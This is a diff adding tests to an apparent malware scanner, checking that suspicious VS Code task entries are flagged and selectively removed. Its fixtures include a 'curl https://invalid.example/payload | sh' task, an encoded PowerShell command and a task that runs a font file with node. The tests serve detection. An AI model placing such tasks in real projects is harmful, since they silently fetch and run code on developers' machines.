@@ -1,5 +1,7 @@
+import fs from "node:fs";
+import path from "node:path";
 import { describe, expect, it } from "vitest";
-import { scan } from "../src/index.js";
+import { clean, scan } from "../src/index.js";
 import { severityRank, type Finding } from "../src/core/types.js";
 import { fake, fixture, project } from "./helpers/project.js";
 
@@ -34,6 +36,72 @@ describe("harmless code", () => {
 });
 
 describe("suspicious behaviour", () => {
+  it("flags VS Code tasks that execute font assets as critical, not ordinary task/font entries", async () => {
+    const root = project({
+      ".vscode/tasks.json": `{
+        // VS Code task config supports comments.
+        "version": "2.0.0",
+        "tasks": [
+          { "label": "build", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-700.otf"] },
+          { "label": "copy assets", "type": "shell", "command": "npm run copy-fonts" },
+          { "label": "build app", "type": "shell", "command": "node build.js --font public/fonts/fa-regular-400.woff2" }
+        ]
+      }`,
+      "public/fonts/fa-regular-400.woff2": "font fixture, not executable code",
+    });
+    const report = await scan({ root, includeGitHistory: false });
+    const finding = report.findings.find((item) => item.ruleId === "RS-VSC-001");
+    expect(finding?.severity).toBe("critical");
+    expect(finding?.confidence).toBe("high");
+    expect(finding?.file).toBe(".vscode/tasks.json");
+    expect(report.findings.filter((item) => item.ruleId === "RS-VSC-001")).toHaveLength(1);
+  });
+
+  it("flags VS Code tasks that download and execute or launch encoded commands", async () => {
+    const root = project({
+      ".vscode/tasks.json": JSON.stringify({
+        version: "2.0.0",
+        tasks: [
+          { label: "remote", type: "shell", command: "curl https://invalid.example/payload | sh" },
+          { label: "encoded", type: "shell", command: "powershell -EncodedCommand ZQBjAGgAbwA=" },
+        ],
+      }),
+    });
+    const report = await scan({ root, includeGitHistory: false });
+    const findings = report.findings.filter((item) => item.ruleId === "RS-VSC-001");
+    expect(findings).toHaveLength(2);
+    expect(findings.every((item) => item.severity === "critical" && item.confidence === "high")).toBe(true);
+  });
+
+  it("only removes suspicious VS Code task entries when clean({ remove: true }) is explicit", async () => {
+    const taskFile = `{
+      // Keep this unrelated task.
+      "version": "2.0.0",
+      "tasks": [
+        { "label": "bad", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-700.otf"] },
+        { "label": "good", "type": "shell", "command": "npm run copy-fonts" },
+        { "label": "build app", "type": "shell", "command": "node build.js --font public/fonts/fa-solid-700.otf" }
+      ]
+    }`;
+    const root = project({
+      ".vscode/tasks.json": taskFile,
+      "public/fonts/fa-solid-700.otf": "font fixture, not executable code",
+    });
+    const tasksPath = path.join(root, ".vscode/tasks.json");
+
+    await clean({ root, includeGitHistory: false });
+    expect(fs.readFileSync(tasksPath, "utf8")).toBe(taskFile);
+
+    const report = await clean({ root, includeGitHistory: false, remove: true });
+    const updated = fs.readFileSync(tasksPath, "utf8");
+    expect(updated).not.toContain('"label": "bad"');
+    expect(updated).toContain("npm run copy-fonts");
+    expect(updated).toContain("node build.js --font public/fonts/fa-solid-700.otf");
+    expect(fs.existsSync(path.join(root, "public/fonts/fa-solid-700.otf"))).toBe(true);
+    expect(report.findings.some((item) => item.ruleId === "RS-VSC-001")).toBe(false);
+    expect(report.notes.join(" ")).toMatch(/Removed 1 suspicious VS Code task entry/);
+  });
+
   it("flags a decoded payload that reaches eval as critical", async () => {
     const r = await scan({ root: project({ "src/loader.js": fixture("malicious/decode-exec.js.txt") }) });
     const f = r.findings.find((x) => x.ruleId === "RS-EXEC-002");
